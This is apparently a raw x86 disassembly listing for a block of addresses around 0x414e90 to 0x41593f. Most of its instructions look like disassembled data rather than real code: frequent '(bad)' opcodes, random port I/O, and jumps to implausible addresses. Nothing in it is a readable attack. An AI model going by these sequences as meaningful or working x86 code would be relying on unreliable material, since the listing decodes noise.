  414e90:	fsubr  st,st(6)
  414e92:	es cld 
  414e94:	jnp    0x414e7c
  414e96:	xchg   ecx,eax
  414e97:	add    eax,DWORD PTR [esi]
  414e99:	pop    ebx
  414e9a:	add    DWORD PTR [ebx],0xbe5c5af6
  414ea0:	outs   dx,DWORD PTR ds:[esi]
  414ea1:	mov    esi,DWORD PTR [esi+edi*2+0x4f]
  414ea5:	out    dx,al
  414ea6:	inc    BYTE PTR [ebx-0x1d]
  414ea9:	in     eax,0x7c
  414eab:	dec    ebx
  414eac:	dec    edx
  414ead:	jo     0x414e9a
  414eaf:	pop    edx
  414eb0:	add    DWORD PTR [ecx-0x19],0x541b2703
  414eb7:	or     DWORD PTR [ebp-0x4f],eax
  414eba:	jmp    0x8cb46ac2
  414ebf:	int3   
  414ec0:	fcomp  QWORD PTR [edx-0x3a]
  414ec3:	mov    ecx,0xf5eef327
  414ec8:	adc    ah,dh
  414eca:	bound  edx,QWORD PTR [eax+ebx*4-0x21]
  414ece:	mov    bl,0x3b
	...
  414ef8:	add    BYTE PTR [edx],al
  414efa:	out    0x37,al
  414efc:	(bad)  
  414efd:	add    ecx,DWORD PTR [edi-0x2c0dbd27]
  414f03:	ins    BYTE PTR es:[edi],dx
  414f04:	xor    al,0xf2
  414f06:	in     eax,0x8e
  414f08:	scas   al,BYTE PTR es:[edi]
  414f09:	jecxz  0x414f88
  414f0b:	and    esi,DWORD PTR [ecx+0x797e5b5c]
  414f11:	ret    
  414f12:	in     eax,dx
  414f13:	add    BYTE PTR [esi+0x5f],dh
  414f16:	in     eax,0x73
  414f18:	loope  0x414f11
  414f1a:	xchg   DWORD PTR [edi],ebp
  414f1c:	pop    di
  414f1e:	rol    DWORD PTR [ebx-0x21b08b3],cl
  414f24:	ret    
  414f25:	pop    ds
  414f26:	jae    0x414f8f
  414f28:	mov    esp,0x7cfee5d8
  414f2d:	push   eax
  414f2e:	in     eax,dx
  414f2f:	std    
  414f30:	fild   QWORD PTR ds:[esi+0x8]
  414f34:	inc    ecx
  414f35:	arpl   WORD PTR [edx],bp
  414f37:	std    
  414f38:	cs xchg ecx,eax
  414f3a:	fsubp  st(0),st
  414f3c:	push   ds
  414f3d:	(bad)  
  414f3f:	push   0xffffffe9
  414f41:	(bad)  
  414f42:	imul   ebp,DWORD PTR [ebx-0x58],0x19b3e61f
  414f49:	daa    
  414f4a:	in     eax,0xfd
  414f4c:	push   es
  414f4d:	xchg   ebp,eax
  414f4e:	pop    ebp
  414f4f:	call   0xfe259825
  414f54:	pusha  
  414f55:	xchg   ebp,eax
  414f56:	stc    
  414f57:	cmc    
  414f58:	out    dx,al
  414f59:	(bad)  
  414f5b:	add    ebp,0x0
	...
  414f86:	mul    ah
  414f88:	std    
  414f89:	cmp    DWORD PTR [eax+0x20286b67],eax
  414f8f:	out    0xb3,al
  414f91:	(bad)  
  414f93:	in     al,0xfd
  414f95:	(bad)  
  414f96:	aam    0x5c
  414f98:	call   0xfe27588e
  414f9d:	pusha  
  414f9e:	xchg   esp,eax
  414f9f:	add    al,0xf6
  414fa1:	scas   al,BYTE PTR es:[edi]
  414fa2:	pop    esi
  414fa3:	jb     0x414fa5
  414fa5:	adc    DWORD PTR [esi+0x5ee93f77],esp
  414fab:	scas   eax,DWORD PTR es:[edi]
  414fac:	lock sahf 
  414fae:	pop    esi
  414faf:	in     eax,0xfd
  414fb1:	adc    al,0x10
  414fb3:	repz jmp 0x414fb6
  414fb6:	xchg   ebp,eax
  414fb7:	cdq    
  414fb8:	dec    BYTE PTR [ecx-0x97fc8]
  414fbe:	push   edx
  414fbf:	retf   
  414fc0:	test   al,dl
  414fc2:	dec    edx
  414fc3:	cdq    
  414fc4:	(bad)  
  414fc5:	push   eax
  414fc6:	int    0xcf
  414fc8:	ins    BYTE PTR es:[edi],dx
  414fc9:	inc    ecx
  414fca:	lds    ebx,FWORD PTR [ecx-0x66b50f4c]
  414fd0:	(bad)  
  414fd1:	dec    eax
  414fd3:	push   eax
  414fd4:	call   0xfedae5a6
  414fd9:	mov    eax,edi
  414fdb:	mov    esi,esi
  414fdd:	call   DWORD PTR [edx-0x4a]
  414fe0:	std    
  414fe1:	shr    BYTE PTR [bp+si+0x40],1
  414fe6:	inc    edx
  414fe7:	arpl   bp,bp
  414fe9:	test   DWORD PTR [eax],0x0
	...
  415013:	adc    bl,BYTE PTR [ecx+0x307d75fe]
  415019:	scas   eax,DWORD PTR es:[edi]
  41501a:	xor    BYTE PTR [edx],dl
  41501c:	cdq    
  41501d:	mov    BYTE PTR [ebp-0x1deef],al
  415023:	rcl    dl,0xc1
  415026:	not    DWORD PTR [edx-0x66]
  415029:	dec    ebp
  41502a:	push   0x40aadd
  41502f:	inc    edx
  415030:	ins    BYTE PTR es:[edi],dx
  415031:	in     eax,dx
  415032:	not    DWORD PTR [edx-0x66]
  415035:	(bad)  
  415036:	jne    0x415075
  415038:	xor    BYTE PTR [edi-0x7765add0],cl
  41503e:	test   ebp,ecx
  415040:	and    esi,edi
  415042:	jmp    FWORD PTR [edi+0x5f]
  415045:	push   0xfe1860b1
  41504a:	dec    BYTE PTR [eax-0x3d0009d1]
  415050:	cdq    
  415051:	je     0x41505b
  415053:	lea    esp,[ecx-0x32e300d3]
  415059:	mov    DWORD PTR [esp+ebx*8-0x5601c034],eax
  415060:	jbe    0x4150de
  415062:	not    bl
  415064:	fs aam 0x67
  415067:	mov    DWORD PTR [esi-0x3f],ebx
  41506a:	inc    edx
  41506c:	cs xor al,0xf6
  41506f:	mov    ebx,0x24743f7c
  415074:	mov    dl,bh
  415076:	das    
	...
  41509f:	add    BYTE PTR [ebx+0x6084898c],ch
  4150a5:	mov    WORD PTR [edi],?
  4150a7:	(bad)  
  4150a8:	lahf   
  4150a9:	fidiv  WORD PTR [eax]
  4150ab:	not    BYTE PTR [ebx-0x5ff0fbdc]
  4150b1:	xor    al,0x4
  4150b3:	add    BYTE PTR [ecx+esi*2],bl
  4150b6:	jge    0x415087
  4150b8:	jae    0x4150f6
  4150ba:	aas    
  4150bb:	(bad)  
  4150bc:	call   0xa4fdd5b7
  4150c1:	inc    esp
  4150c2:	aas    
  4150c3:	(bad)  
  4150c4:	sbb    al,0x5
  4150c6:	xchg   BYTE PTR [eax+0x6801f21c],dh
  4150cc:	sbb    al,0xf2
  4150ce:	xor    BYTE PTR [ebp-0x17ee99b5],bh
  4150d4:	xchg   BYTE PTR [edx],bl
  4150d6:	inc    ecx
  4150d7:	(bad)  
  4150d8:	cmp    eax,esi
  4150da:	sub    eax,0x410433f6
  4150df:	je     0x4150ed
  4150e1:	sbb    dl,BYTE PTR [eax]
  4150e3:	sub    ah,BYTE PTR [ebx]
  4150e5:	adc    al,0x41
  4150e7:	mov    ah,0x4
  4150e9:	mov    ds:0x2813fe40,al
  4150ee:	adc    al,0xe8
  4150f0:	sbb    al,0x5e
  4150f2:	aas    
  4150f3:	inc    BYTE PTR [ebx]
  4150f5:	push   0x5bfbf625
  4150fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150fb:	inc    eax
  4150fc:	push   0x34358f4b
  415101:	loop   0x415099
  415103:	inc    eax
	...
  41512c:	add    BYTE PTR [eax-0x25bf6901],ch
  415132:	loop   0x415170
  415134:	and    ecx,edx
  415136:	loop   0x4151b6
  415138:	inc    eax
  415139:	push   eax
  41513a:	dec    ebx
  41513b:	jg     0x4151b2
  41513d:	hlt    
  41513e:	loope  0x4151ae
  415140:	inc    eax
  415141:	jo     0x415146
  415143:	pop    edi
  415144:	inc    eax
  415145:	mov    dl,0xe2
  415147:	aam    0x13
  415149:	mov    ah,0xb
  41514b:	add    DWORD PTR [ecx-0x5e],eax
  41514e:	loop   0x4150e4
  415150:	push   ebx
  415151:	xchg   edx,eax
  415152:	loop   0x41519a
  415154:	inc    eax
  415155:	enter  0x3707,0x40
  415159:	mov    ah,dl
  41515b:	mov    esp,0xcb7413
  415160:	inc    ecx
  415161:	jp     0x415145
  415163:	pop    esp
  415164:	dec    edi
  415165:	push   0xffffffe2
  415167:	push   ds
  415168:	inc    eax
  415169:	lock dec edx
  41516b:	push   DWORD PTR [eax+0x34]
  41516e:	loop   0x41517e
  415170:	inc    eax
  415171:	nop
  415172:	pop    ss
  415173:	(bad)  
  415174:	aas    
  415175:	push   edx
  415176:	loop   0x4151ac
  415178:	dec    ebx
  415179:	push   edx
  41517a:	loop   0x415172
  41517c:	aas    
  41517d:	enter  0xff4a,0xb0
  415181:	add    al,0xe2
  415183:	out    0x3f,al
  415185:	push   0x2a3fd71b
  41518a:	loop   0x4151e8
  41518c:	adc    al,0x34
  41518e:	iret   
  41518f:	add    BYTE PTR [edi],bh
	...
  4151b9:	add    BYTE PTR [edx],bl
  4151bb:	loop   0x415239
  4151bd:	jl     0x4151c9
  4151bf:	loop   0x41517f
  4151c1:	aas    
  4151c2:	rcr    BYTE PTR [esi-0x1ebc4200],1
  4151c8:	std    
  4151c9:	xor    al,0x10
  4151cb:	repz dec esp
  4151cd:	shl    BYTE PTR [edx],1
  4151cf:	loope  0x4151ce
  4151d1:	adc    al,0x10
  4151d3:	loop   0x415188
  4151d5:	cdq    
  4151d6:	sub    esp,ecx
  4151d8:	std    
  4151d9:	mov    ss,WORD PTR [ebp+0x5d6be859]
  4151df:	loope  0x4151de
  4151e1:	jle    0x415228
  4151e3:	repnz cmc 
  4151e5:	jbe    0x4151ea
  4151e7:	cli    
  4151e8:	inc    edi
  4151e9:	mov    ebp,0x9cfde0fa
  4151ee:	in     al,dx
  4151ef:	call   0x2039b0f1
  4151f4:	sub    al,0x56
  4151f6:	jecxz  0x4151d8
  4151f8:	mov    bl,0x41
  4151fa:	push   ebx
  4151fb:	loope  0x4151fa
  4151fd:	push   ecx
  4151fe:	(bad)  
  4151ff:	xor    eax,0xa74b3efd
  415204:	in     al,0x3e
  415206:	inc    ebx
  415207:	loope  0x4151f1
  415209:	add    DWORD PTR [eax+eiz*8-0x3],ebp
  41520d:	es cmc 
  41520f:	add    esi,esi
  415211:	push   ds
  415212:	sub    edi,edx
  415214:	sbb    eax,ebp
  415216:	and    ah,cl
  415218:	std    
  415219:	push   esp
  41521a:	clc    
  41521b:	call   0x41591d
	...
  415248:	dec    esp
  415249:	sub    al,0xfe
  41524b:	or     ah,cl
  41524d:	mov    bl,0x1d
  41524f:	or     esp,ecx
  415251:	std    
  415252:	add    DWORD PTR [ebx],esp
  415254:	das    
  415255:	std    
  415256:	out    0xf2,al
  415258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415259:	int3   
  41525a:	(bad)  
  41525b:	jmp    0xfde0:0x36d5e8e0
  415262:	into   
  415263:	xchg   esp,eax
  415264:	sbb    dh,dh
  415266:	add    dl,bl
  415268:	and    ebp,esp
  41526a:	icebp  
  41526b:	cs and dh,bh
  41526e:	inc    DWORD PTR [eax-0x35000964]
  415274:	xor    al,0xe3
  415276:	sub    edi,DWORD PTR [edx+0x49b5fe21]
  41527c:	sub    esi,edi
  41527e:	call   FWORD PTR [ebp-0x5500d57b]
  415284:	and    DWORD PTR [eax+edi*8-0x54],eax
  415288:	hlt    
  415289:	cld    
  41528a:	dec    DWORD PTR [edx+0x21]
  41528d:	je     0x41528b
  41528f:	popf   
  415290:	sub    DWORD PTR [esi],edx
  415292:	add    ch,al
  415294:	(bad)  
  415295:	mov    edi,0x8b03c50c
  41529a:	in     al,dx
  41529b:	ss cwde 
  41529d:	stc    
  41529e:	push   0xffffffb5
  4152a0:	mov    dl,0x59
  4152a2:	push   DWORD PTR [eax+0x54]
  4152a5:	call   0xfe618097
  4152aa:	mov    DWORD PTR [eax],eax
	...
  4152d4:	shl    BYTE PTR [eax],0xfe
  4152d7:	jne    0x415356
  4152d9:	mov    ah,0x46
  4152db:	ins    DWORD PTR es:[edi],dx
  4152dc:	les    ebx,FWORD PTR [ebp+edi*8+0x35]
  4152e0:	and    al,0x14
  4152e2:	inc    ecx
  4152e3:	add    BYTE PTR ds:0xafff98b,cl
  4152e9:	and    DWORD PTR [eax+ecx*1-0x63],esi
  4152ed:	sbb    DWORD PTR [ebp+0x41],ebp
  4152f0:	inc    ebp
  4152f1:	mov    ah,0xff
  4152f3:	push   DWORD PTR ds:0x49bbe5dc
  4152f9:	push   ds
  4152fa:	(bad)  
  4152fb:	push   DWORD PTR [eax+0x2d75fe1f]
  415301:	xor    al,0xfd
  415303:	sub    BYTE PTR [edx+0x1e],cl
  415306:	enter  0x1cc2,0xee
  41530a:	add    DWORD PTR [ebp-0x59],edx
  41530d:	popf   
  41530e:	jg     0x4152d3
  415310:	adc    BYTE PTR [edx+0x5ffb0004],cl
  415316:	lods   al,BYTE PTR ds:[esi]
  415317:	leave  
  415318:	jno    0x41534d
  41531a:	add    al,0xff
  41531c:	jno    0x41531c
  41531e:	cmp    al,0x74
  415320:	and    al,0xca
  415322:	aad    0x53
  415324:	jmp    0x4152e6
  415326:	lods   al,BYTE PTR ds:[esi]
  415327:	add    BYTE PTR [ecx+ebx*8],bl
  41532a:	jle    0x415393
  41532c:	repnz faddp st(2),st
  41532f:	call   edx
  415331:	fimul  WORD PTR ds:0x29ea51ff
  415337:	aas    
	...
  415360:	add    BYTE PTR [eax+0x69],ch
  415363:	cmp    edi,esi
  415365:	xor    esi,edi
  415367:	sub    DWORD PTR [ebp+0xa3b78ec],esp
  41536d:	fadd   QWORD PTR ds:0x865988f7
  415373:	lods   al,BYTE PTR ds:[esi]
  415374:	call   FWORD PTR [ebx+0x66677e20]
  41537a:	push   es
  41537b:	ret    
  41537c:	dec    DWORD PTR [edx+0x9fe3da6]
  415382:	cli    
  415383:	sub    DWORD PTR [ebx],ebx
  415385:	shl    BYTE PTR [eax],1
  415387:	cmp    esp,DWORD PTR [edi+0x1d]
  41538a:	repnz sub al,0xbd
  41538d:	hlt    
  41538e:	daa    
  41538f:	lods   eax,DWORD PTR ds:[esi]
  415390:	inc    eax
  415391:	sbb    al,0x49
  415393:	mov    ch,0xfb
  415395:	pop    ebx
  415396:	(bad)  
  415397:	or     eax,ebp
  415399:	sbb    edi,DWORD PTR [esi+0x664bfe3c]
  41539f:	cmp    eax,0x3d1d11e7
  4153a4:	(bad)  
  4153a5:	xor    ecx,DWORD PTR gs:[eax+eax*1]
  4153a9:	leave  
  4153aa:	pop    edx
  4153ab:	jb     0x4153dc
  4153ad:	sahf   
  4153ae:	push   ss
  4153af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153b0:	test   eax,0xae047723
  4153b5:	pop    esp
  4153b6:	pop    ebx
  4153b7:	aas    
  4153b8:	aaa    
  4153b9:	sbb    BYTE PTR [edi+eiz*8-0x30b06fc4],0x4
  4153c1:	xor    bl,dh
  4153c3:	mov    dh,0x8
	...
  4153ed:	add    ah,bl
  4153ef:	addr16 aad 0x8a
  4153f2:	pop    eax
  4153f3:	fbld   TBYTE PTR [esi+0x14dee7b6]
  4153f9:	or     al,0xf4
  4153fb:	jle    0x415393
  4153fd:	cmp    al,0xda
  4153ff:	ficom  WORD PTR [eax+eax*2]
  415402:	mov    ebx,0xca3cd208
  415407:	jno    0x4153f0
  415409:	stos   DWORD PTR es:[edi],eax
  41540a:	add    ch,BYTE PTR [ebp+0x28]
  41540d:	add    al,0x44
  41540f:	call   0xddf51710
  415414:	fmul   QWORD PTR [edi]
  415416:	mov    ah,0x4
  415418:	or     eax,0x2752a23d
  41541d:	mov    bh,0x31
  41541f:	aam    0xa4
  415421:	aas    
  415422:	xchg   edx,eax
  415423:	push   0x53103c43
  415428:	dec    edi
  415429:	repnz sbb dh,0x36
  41542d:	cmp    al,0xf0
  41542f:	fidivr WORD PTR [edi]
  415431:	fs inc ebp
  415433:	fisub  WORD PTR [esi]
  415435:	test   eax,0xadb7766b
  41543a:	fcomp  QWORD PTR [edx+0x7f]
  41543d:	or     dl,cl
  41543f:	fwait
  415440:	out    0x3c,eax
  415442:	enter  0xf4e,0x68
  415446:	clc    
  415447:	(bad)  
  415449:	pop    es
  41544a:	pop    esp
  41544b:	addr16 add bh,bl
  41544e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41544f:	xchg   edi,eax
  415450:	cld    
  415451:	out    dx,al
	...
  41547a:	add    BYTE PTR [ecx-0x1e],ch
  41547d:	std    
  41547e:	pop    esp
  41547f:	sbb    bl,dh
  415481:	add    esi,ebx
  415483:	out    0xdc,eax
  415485:	std    
  415486:	pop    esp
  415487:	push   esp
  415488:	div    BYTE PTR [edi+0x3]
  41548b:	push   edi
  41548c:	fisttp QWORD PTR [ebx+0x688e4c2c]
  415492:	xor    esi,DWORD PTR [esi+0x2b41009a]
  415498:	ins    DWORD PTR es:[edi],dx
  415499:	aas    
  41549a:	jmp    0x914dbbd5
  41549f:	stos   DWORD PTR es:[edi],eax
  4154a0:	cs std 
  4154a2:	sahf   
  4154a3:	adc    ebx,DWORD PTR [ebx]
  4154a5:	jne    0x4154b7
  4154a7:	test   eax,0x956af896
  4154ac:	jmp    0xd0b950b5
  4154b1:	inc    ebx
  4154b2:	adc    DWORD PTR [ebx-0x4126c323],0x1cf7fddd
  4154bc:	mov    ds:0x5b200e10,eax
  4154c1:	xchg   DWORD PTR [edi+ebp*8-0x32a9b310],esp
  4154c8:	in     eax,dx
  4154c9:	push   0x9ac5b1
  4154ce:	je     0x41552d
  4154d0:	adc    eax,0x47515151
  4154d5:	add    cl,ch
  4154d7:	mov    ds:0x5d5c0d19,al
  4154dc:	sbb    DWORD PTR [ecx+0x74],edx
	...
  415507:	add    BYTE PTR [ebp+0x15],bl
  41550a:	push   ecx
  41550b:	xchg   ecx,eax
  41550c:	adc    ch,BYTE PTR [ebp+0x3f]
  41550f:	jmp    0x14dbc2a
  415514:	inc    edi
  415515:	cs std 
  415517:	add    BYTE PTR [edx],ah
  415519:	dec    esi
  41551a:	shl    BYTE PTR [ecx+eiz*2-0x32],0x44
  41551f:	cld    
  415520:	(bad)  
  415521:	mov    ds:0x4cab03c1,eax
  415526:	std    
  415527:	jne    0x41556a
  415529:	and    BYTE PTR [eax+ecx*1+0x4d],dh
  41552d:	(bad)  
  41552e:	sti    
  41552f:	push   edx
  415531:	and    DWORD PTR [esp+edi*8-0x23],esi
  415535:	sub    DWORD PTR [eax],ebp
  415537:	jmp    edx
  415539:	and    DWORD PTR [eax+esi*8+0x76],ecx
  41553d:	mov    ds:0x713800ed,eax
  415542:	(bad)  
  415543:	jne    0x4154f2
  415545:	xor    bl,ah
  415547:	sub    edx,eax
  415549:	and    eax,ecx
  41554b:	ret    0x58ed
  41554e:	push   ebx
  41554f:	mov    esp,DWORD PTR [ecx+0x1ffcc1d5]
  415555:	push   edi
  415556:	push   0x5d
  415558:	mov    ds:0xcde805ab,al
  41555d:	stc    
  41555e:	(bad)  
  41555f:	(bad)  
  415560:	cmp    al,0x1b
  415562:	cli    
  415563:	push   0xbeed58c5
  415568:	int    0x8e
  41556a:	ins    BYTE PTR es:[edi],dx
  41556b:	inc    ecx
	...
  415594:	add    BYTE PTR [ebp-0x3b922050],dh
  41559a:	pop    eax
  41559b:	std    
  41559c:	jne    0x41561b
  41559e:	xor    dl,dh
  4155a0:	push   edx
  4155a1:	loop   0x4155c3
  4155a3:	add    DWORD PTR gs:[ebp+0x31],esi
  4155a7:	mov    ebx,0x40b31b68
  4155ac:	add    BYTE PTR [ebp+0x36],bl
  4155af:	ins    BYTE PTR es:[edi],dx
  4155b0:	inc    ecx
  4155b1:	jne    0x4155d4
  4155b3:	je     0x4155bd
  4155b5:	or     eax,0x1cff4f84
  4155ba:	inc    ebp
  4155bb:	test   eax,0x78dd53ff
  4155c0:	addr16 push esi
  4155c2:	mov    esp,0xa848bbff
  4155c8:	inc    eax
  4155c9:	sbb    al,0xe5
  4155cb:	lods   eax,DWORD PTR ds:[esi]
  4155cc:	pop    es
  4155cd:	inc    esp
  4155ce:	aaa    
  4155cf:	sar    esi,cl
  4155d1:	sub    ecx,DWORD PTR [edx-0x43ccffff]
  4155d7:	lods   al,BYTE PTR ds:[esi]
  4155d8:	aad    0x89
  4155da:	xor    eax,DWORD PTR [eax+ebp*2]
  4155dd:	pop    es
  4155de:	pop    ds
  4155df:	sar    edi,0xa
  4155e2:	pop    ds
  4155e3:	or     al,0xe8
  4155e5:	mov    dl,0x3f
  4155e7:	aaa    
  4155e8:	(bad)  
  4155e9:	sti    
  4155ea:	fisub  WORD PTR [edx]
  4155ec:	inc    edi
  4155ed:	pop    ebp
  4155ee:	repnz cmp BYTE PTR [esp+edx*1-0x36],dh
  4155f3:	fdivp  st(5),st
  4155f5:	jecxz  0x4155b3
  4155f7:	lods   al,BYTE PTR ds:[esi]
  4155f8:	add    DWORD PTR [eax],eax
	...
  415622:	sbb    al,0xf2
  415624:	cmp    esi,0x4c29fa49
  41562a:	retf   0x37d4
  41562d:	dec    BYTE PTR [ecx+0x5e]
  415630:	aaa    
  415631:	je     0x415657
  415633:	fimul  DWORD PTR [ecx+0x25]
  415636:	mov    bl,0x6c
  415638:	dec    ecx
  415639:	shl    DWORD PTR [eax],0xf2
  41563c:	into   
  41563d:	mov    dh,BYTE PTR [eax-0x6404bf90]
  415643:	dec    BYTE PTR ds:0x29e209ff
  415649:	xchg   edi,eax
  41564a:	inc    ebp
  41564b:	xchg   ebp,eax
  41564c:	aaa    
  41564d:	or     bl,BYTE PTR [ebp+eiz*4-0xe]
  415651:	mov    cl,ah
  415653:	and    eax,0x2d147437
  415658:	lods   eax,DWORD PTR ds:[esi]
  415659:	pop    es
  41565a:	je     0x4156b6
  41565c:	cmp    al,0xdf
  41565e:	(bad)  
  41565f:	fistp  DWORD PTR [esi]
  415661:	scas   eax,DWORD PTR es:[edi]
  415662:	daa    
  415663:	fcomp  QWORD PTR [ebx+ecx*1+0x38c52e44]
  41566a:	dec    edx
  41566b:	fstp   TBYTE PTR [edi+esi*1+0x42]
  41566f:	gs out dx,eax
  415671:	sub    edi,esp
  415673:	xor    al,0xf6
  415675:	cmp    BYTE PTR [edx],dh
  415677:	gs jmp 0x4156a5
  41567a:	and    DWORD PTR [edx],esi
  41567c:	out    0x38,al
  41567e:	imul   ebx,DWORD PTR [ecx-0x19],0x3
  415682:	sbb    al,0xa4
  415684:	test   eax,0xf
	...
  4156ad:	add    BYTE PTR [eax],al
  4156af:	sbb    al,0x30
  4156b1:	bound  esp,QWORD PTR [edi]
  4156b3:	sahf   
  4156b4:	lahf   
  4156b5:	mov    edi,0x122e69d0
  4156ba:	pop    ebp
  4156bb:	mov    edx,0xf3c3453b
  4156c0:	out    0x24,eax
  4156c2:	cmp    BYTE PTR [ebx+0x32],bl
  4156c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156c6:	scas   al,BYTE PTR es:[edi]
  4156c7:	adc    ebx,edx
  4156c9:	adc    al,0x8
  4156cb:	(bad)  
  4156cc:	rol    dl,1
  4156ce:	cmp    dl,dl
  4156d0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4156d2:	scas   eax,DWORD PTR es:[edi]
  4156d3:	and    eax,0x1c040f2b
  4156d8:	retf   0x383d
  4156db:	xor    bh,dl
  4156dd:	pop    ss
  4156de:	shl    DWORD PTR [edx+0x2a2bdf50],1
  4156e4:	fisub  DWORD PTR [esi+0x38]
  4156e7:	push   ss
  4156e8:	mov    bl,0x4f
  4156ea:	js     0x41572f
  4156ec:	ficom  DWORD PTR [esi+0x37]
  4156ef:	dec    esi
  4156f0:	fwait
  4156f1:	nop
  4156f2:	cmp    BYTE PTR [edx-0x4ecab926],cl
  4156f8:	xchg   ebx,eax
  4156f9:	out    0xae,al
  4156fb:	pop    edi
  4156fc:	sbb    al,BYTE PTR [ecx]
  4156fe:	mov    edx,0x5c001bc4
  415703:	stos   BYTE PTR es:[edi],al
  415704:	(bad)  
  415705:	push   eax
  415706:	mov    esi,0x1e104f24
  41570b:	mov    ah,BYTE PTR [esi-0x18]
  41570e:	pop    ebp
  41570f:	inc    eax
  415710:	fscale 
  415712:	loop   0x415714
	...
  41573c:	fisttp WORD PTR [ebp+0x30]
  41573f:	cdq    
  415740:	xchg   esi,eax
  415741:	pop    ds
  415742:	clc    
  415743:	xchg   ecx,eax
  415744:	and    BYTE PTR [ebx-0x13],bl
  415747:	aaa    
  415748:	hlt    
  415749:	dec    esi
  41574a:	or     BYTE PTR [ecx],al
  41574c:	daa    
  41574d:	jg     0x41574c
  41574f:	out    0x53,al
  415751:	fnstenv [ebx-0xf]
  415754:	inc    edi
  415755:	jmp    0x41577a
  415757:	(bad)  
  415758:	dec    ebx
  415759:	fnstenv [ebx-0x33]
  41575c:	push   ebx
  41575d:	dec    edi
  41575e:	clc    
  41575f:	(bad)  
  415760:	int    0x61
  415762:	call   0xfe1a547d
  415767:	rol    edi,0x81
  41576a:	std    
  41576b:	scas   al,BYTE PTR es:[edi]
  41576c:	lahf   
  41576d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41576e:	jmp    DWORD PTR [edi+ebp*8+0x139eb819]
  415775:	fscale 
  415777:	fwait
  415778:	cmp    dl,BYTE PTR [edx+0x19421405]
  41577e:	ret    0xd916
  415781:	(bad)  [esp+0x765529f4]
  415788:	ins    DWORD PTR es:[edi],dx
  415789:	imul   edi,ebp,0x5bc323f4
  41578f:	adc    ch,bl
  415791:	fmul   DWORD PTR [ecx]
  415793:	sub    esp,ecx
  415795:	xor    edx,DWORD PTR [eax+0x62]
  415798:	dec    eax
  415799:	fnstsw WORD PTR [ebx+0x4d]
  41579c:	and    DWORD PTR [ecx+0x4c],edx
	...
  4157c7:	add    BYTE PTR [eax],al
  4157c9:	cmc    
  4157ca:	rol    BYTE PTR [eax],1
  4157cc:	jne    0x41584d
  4157ce:	pop    ss
  4157cf:	dec    DWORD PTR [ebp+0x29]
  4157d2:	pop    es
  4157d3:	add    DWORD PTR [eax],eax
  4157d5:	sub    dl,BYTE PTR [ecx-0x2]
  4157d8:	jne    0x415813
  4157da:	test   eax,0x65b0ff56
  4157df:	call   0xfed383ba
  4157e4:	or     ecx,DWORD PTR ds:0x5b802c86
  4157ea:	pop    ebx
  4157eb:	jae    0x415815
  4157ed:	adc    DWORD PTR [eax+0x5d9ffc4c],0xffffff8b
  4157f4:	inc    ebp
  4157f5:	cmp    DWORD PTR [ebp-0x514b17ad],ebp
  4157fb:	(bad)  
  4157fc:	dec    DWORD PTR [esi]
  4157fe:	sbb    eax,0x5d5d1471
  415803:	add    bh,ch
  415805:	fwait
  415806:	xchg   ecx,eax
  415807:	je     0x415805
  415809:	and    ebp,DWORD PTR [eax-0x7b128a02]
  41580f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415810:	(bad)  
  415811:	stos   BYTE PTR es:[edi],al
  415812:	xchg   ecx,eax
  415813:	or     bl,al
  415815:	fnstsw WORD PTR [ecx+0x26]
  415818:	(bad)  
  415819:	mov    edx,0x3cc03290
  41581e:	xchg   ecx,eax
  41581f:	(bad)  
  415820:	jmp    FWORD PTR [edx-0x3dc75476]
  415826:	or     eax,DWORD PTR [edx+0x410021bf]
	...
  415854:	add    BYTE PTR [eax],al
  415856:	dec    eax
  415857:	fwait
  415858:	stc    
  415859:	push   eax
  41585a:	adc    dl,BYTE PTR [eax+0xb3a1074]
  415860:	or     ch,al
  415862:	pop    ecx
  415863:	ret    0xfffe
  415866:	mov    ds,WORD PTR [ecx+esi*2]
  415869:	xor    BYTE PTR [edx+edx*1],bl
  41586c:	lea    eax,[esp+eax*4-0x66]
  415870:	std    
  415871:	push   DWORD PTR [edx-0x20]
  415874:	ss je  0x41589b
  415877:	sub    ah,BYTE PTR [ecx-0x316e8cdd]
  41587d:	(bad)  
  41587e:	icebp  
  41587f:	mov    ecx,0x8138b829
  415884:	ss (bad) 
  415886:	shl    DWORD PTR [ebp+0x36],1
  415889:	je     0x4158df
  41588b:	jno    0x41583d
  41588d:	pop    es
  41588e:	xor    al,0xe9
  415890:	(bad)  
  415892:	inc    ebx
  415893:	push   0xffffff92
  415895:	es cmp ebx,ecx
  415898:	jg     0x415864
  41589a:	sbb    eax,0x65bfefce
  41589f:	leave  
  4158a0:	xor    edi,esi
  4158a2:	and    esi,DWORD PTR [esi+eiz*2+0x662f2337]
  4158a9:	or     dh,bh
  4158ab:	xor    eax,0xc22c6805
  4158b0:	and    al,0xbd
  4158b2:	add    edx,DWORD PTR [edi+0x5e3ee80c]
  4158b8:	xor    edi,esi
	...
  4158e2:	add    BYTE PTR [edi+0x4b5dd804],ah
  4158e8:	sti    
  4158e9:	inc    edx
  4158ea:	nop    DWORD PTR [edi-0x2621479]
  4158f1:	xor    al,0xf6
  4158f3:	shl    eax,cl
  4158f5:	test   DWORD PTR [eax+ecx*8-0x6f],eax
  4158f9:	xor    esi,DWORD PTR [esp+ebp*1-0x1f]
  4158fd:	lods   eax,DWORD PTR ds:[esi]
  4158fe:	or     eax,esp
  415900:	inc    ebx
  415901:	ltr    WORD PTR [edi*4+0x12b7441]
  415909:	mov    esi,0xe75b1cf7
  41590e:	add    ebx,DWORD PTR [eax+eiz*4]
  415911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415912:	das    
  415913:	xchg   edx,eax
  415914:	pop    edi
  415915:	out    0x3,eax
  415917:	neg    BYTE PTR [edx-0x3f]
  41591a:	add    esi,esi
  41591c:	pop    edx
  41591d:	rol    DWORD PTR [ebx],1
  41591f:	test   eax,0xa0d4331d
  415924:	fnstsw WORD PTR [ebx]
  415926:	sub    eax,0x3497d76a
  41592b:	call   0x57f08002
  415930:	ret    0x10bf
  415933:	sbb    al,0x5b
  415935:	loop   0x41597a
  415937:	iret   
  415938:	pop    esp
  415939:	add    bh,BYTE PTR [edi-0x3d4fea45]
  41593f:	cmp    ebx,eax
